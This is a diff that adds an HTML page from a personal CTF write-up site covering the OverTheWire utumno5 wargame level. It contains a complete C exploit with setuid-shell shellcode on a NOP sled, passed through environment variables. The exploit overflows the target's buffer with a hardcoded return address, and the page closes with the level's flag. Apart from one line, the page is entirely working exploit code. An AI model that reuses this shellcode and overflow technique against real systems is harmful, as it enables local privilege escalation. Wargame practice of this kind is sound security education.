@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>utumno5 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="utumno5" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/utumno/utumno5.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/utumno/utumno5.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="utumno5" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"utumno5","url":"http://localhost:4000/CTF_writeups/overthewire/utumno/utumno5.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>same as level3, took the code from there.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define PATH "/utumno/utumno5"
+#define POSISTION 16
+</span>
+<span class="cp">#define SHELLCODE "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x01\x58\xcd\x80"
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="n">POSISTION</span><span class="o">+</span><span class="mi">4</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">address_of_shellcode</span> <span class="o">=</span> <span class="mh">0xffffdf87</span><span class="p">;</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">POSISTION</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span>
+
+    <span class="o">*</span><span class="p">((</span><span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">POSISTION</span><span class="p">))</span> <span class="o">=</span> <span class="n">address_of_shellcode</span><span class="p">;</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"1"</span><span class="p">,</span><span class="s">"2"</span><span class="p">,</span><span class="s">"3"</span><span class="p">,</span><span class="s">"4"</span><span class="p">,</span><span class="s">"5"</span><span class="p">,</span><span class="s">"6"</span><span class="p">,</span><span class="s">"7"</span><span class="p">,</span><span class="n">SHELLCODE</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="n">PATH</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/overthewire/utumno/images/level5.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">aGlKWrixsh</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
